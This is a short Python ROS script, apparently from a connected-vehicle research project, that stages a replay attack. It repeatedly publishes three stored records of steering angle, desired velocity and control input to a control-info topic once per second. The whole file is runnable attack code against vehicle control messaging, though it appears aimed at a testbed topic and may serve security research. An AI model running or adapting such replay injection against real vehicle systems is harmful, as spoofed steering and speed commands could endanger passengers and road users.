import rospy
from std_msgs.msg import Float64
from cav_project.msg import ControlInfo  

def replay_attack():
    rospy.init_node('replay_attack_node', anonymous=True)
    
    history_data = [
        {"steering_angle": 15.0, "desired_velocity": 10.0, "control_input": 5.0},
        {"steering_angle": 10.0, "desired_velocity": 15.0, "control_input": 3.0},
        {"steering_angle": 20.0, "desired_velocity": 12.0, "control_input": 7.0},
    ]

  
    target_topic = '/control_info_replay'
    pub = rospy.Publisher(target_topic, ControlInfo, queue_size=10)
    rate = rospy.Rate(1) 
  
    while not rospy.is_shutdown():
        for record in history_data:
            
            replay_msg = ControlInfo()
            replay_msg.steering_angle = record["steering_angle"]
            replay_msg.desired_velocity = record["desired_velocity"]
            replay_msg.control_input = record["control_input"]

           
            rospy.loginfo(f"Replaying: {record}")
            pub.publish(replay_msg)
            
            
            rate.sleep()

if __name__ == '__main__':
    try:
        replay_attack()
    except rospy.ROSInterruptException:
        pass
